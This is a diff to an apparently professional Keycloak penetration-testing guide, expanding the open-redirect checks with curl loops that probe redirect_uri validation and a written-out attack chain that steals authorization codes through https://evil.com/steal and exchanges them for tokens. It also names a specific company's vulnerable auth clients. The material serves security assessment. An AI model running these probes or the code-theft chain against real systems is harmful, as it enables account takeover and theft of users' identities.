@@ -77,20 +77,70 @@ curl -s -o /dev/null -w "%{http_code}" -X POST \
 # 401 = requires initial access token
 ```
 
-### 4. Open Redirect via redirect_uri (3 min)
+### 4. Open Redirect via redirect_uri (5 min) — CRITICAL VECTOR
+
+**Why this matters more than typical open redirects:** If a public client (no client_secret) accepts arbitrary redirect_uri, an attacker can steal the authorization code after legitimate login and exchange it for a valid JWT — full account takeover without knowing the victim's password.
 
 ```bash
-# Test redirect_uri validation strictness
-for uri in "https://evil.com" "//evil.com" \
-           "https://target.com.evil.com" \
-           "https://target.com@evil.com" \
-           "https://evil.com%23@target.com"; do
-  code=$(curl -s -o /dev/null -w "%{http_code}" \
-    "${KC}/realms/master/protocol/openid-connect/auth?client_id=account&redirect_uri=${uri}&response_type=code&scope=openid")
-  echo "  ${uri} → HTTP $code"
-  # 400 = properly rejected, 302 = OPEN REDIRECT FOUND
+# Test redirect_uri validation strictness on ALL public clients
+# First identify public clients:
+for client in "admin-cli" "account" "account-console"; do
+  resp=$(curl -sk -X POST "${KC}/realms/${REALM}/protocol/openid-connect/token" \
+    -d "grant_type=client_credentials&client_id=$client&client_secret=test")
+  echo "$resp" | grep -q "Public client not allowed" && echo "  PUBLIC: $client"
+  echo "$resp" | grep -q "Invalid client" && echo "  INVALID/CONFIDENTIAL: $client"
+done
+
+# Test redirect_uri validation on each public client
+for client in "admin-cli" "account" "${APP_CLIENT_ID}"; do
+  echo "=== Client: $client ==="
+  for uri in \
+    "https://evil.com" \
+    "https://target.com.evil.com" \
+    "https://target.com@evil.com" \
+    "https://evil.com/target.com" \
+    "https://target.com%40evil.com" \
+    "https://target.com/../../evil.com" \
+    "//evil.com"; do
+    # KEY: Check if LOGIN PAGE is shown (not error page)
+    # Login page = redirect_uri ACCEPTED (will redirect after auth)
+    # Error page = redirect_uri REJECTED (safe)
+    body=$(curl -sk "${KC}/realms/${REALM}/protocol/openid-connect/auth?client_id=${client}&redirect_uri=${uri}&response_type=code&scope=openid")
+    if echo "$body" | grep -qiE "sign in|login|kc-form|username"; then
+      echo "  ✓ ACCEPTED (login shown): $uri → VULNERABLE"
+    elif echo "$body" | grep -qi "error"; then
+      echo "  ✗ REJECTED (error): $uri"
+    fi
+  done
 done
 ```
+
+**Detection method:** Do NOT rely on HTTP status codes (302 vs 400). Modern Keycloak returns 200 with either a login page (accepted) or error page (rejected). Check the response BODY for login form indicators.
+
+**Attack chain (if redirect_uri accepted on public client):**
+```bash
+# 1. Attacker crafts phishing link:
+#    https://auth.target.com/realms/REALM/protocol/openid-connect/auth?
+#      client_id=PUBLIC_CLIENT&redirect_uri=https://evil.com/steal&response_type=code&scope=openid
+# 2. Victim clicks → sees legitimate login page (domain is auth.target.com)
+# 3. Victim authenticates (Google SSO, password, etc.)
+# 4. Keycloak redirects to: https://evil.com/steal?code=AUTH_CODE
+# 5. Attacker exchanges code for JWT (no client_secret needed for public clients):
+curl -X POST "${KC}/realms/${REALM}/protocol/openid-connect/token" \
+  -d "grant_type=authorization_code&code=STOLEN_CODE&client_id=${PUBLIC_CLIENT}&redirect_uri=https://evil.com/steal"
+# Returns: {"access_token":"eyJ...", "refresh_token":"..."}
+```
+
+**Severity determination:**
+- Public client + arbitrary redirect_uri accepted → **Critical** (full account takeover via phishing)
+- Confidential client + arbitrary redirect_uri → **High** (still open redirect, but code exchange needs client_secret)
+- Only subdomain variations accepted (e.g., `*.target.com`) → **Medium** (needs XSS on any subdomain to chain)
+
+**Real-world example (BFI Finance, May 2026):**
+- `auth.bfi.co.id` accepted `https://evil.com` for ALL public clients (admin-cli, account, los-operation, los-surveyor)
+- `los-operation` is a public client (no secret needed for code exchange)
+- Combined with CORS reflection on /userinfo → silent identity theft after token obtained
+- Rated Critical 8.1
 
 ### 5. Path Traversal to Admin API (3 min)
 
@@ -263,10 +313,13 @@ Document as a **positive finding** in the report's "Strengths" section:
 | Default credentials work | Critical | admin/admin returns token |
 | Client registration open | High | Can register arbitrary clients |
 | Path traversal to admin API (JSON data returned) | Critical | Unauthenticated admin access |
-| Open redirect | Medium | External redirect_uri accepted |
+| Open redirect (public client, no PKCE) | Critical | Arbitrary redirect_uri + public client = auth code theft |
+| Open redirect (confidential client) | High | Arbitrary redirect_uri accepted but code exchange needs secret |
+| Open redirect (subdomain-only bypass) | Medium | Only *.target.com variations accepted |
 | XSS reflected | Medium | Unencoded payload in HTML |
 | Metrics endpoint exposed | Low | Prometheus metrics readable |
 | Token exchange enabled | Medium | Can exchange tokens without proper validation |
+| CORS origin reflection + credentials on /userinfo | Critical | Cross-origin identity theft |
 
 ## Environment Considerations
 
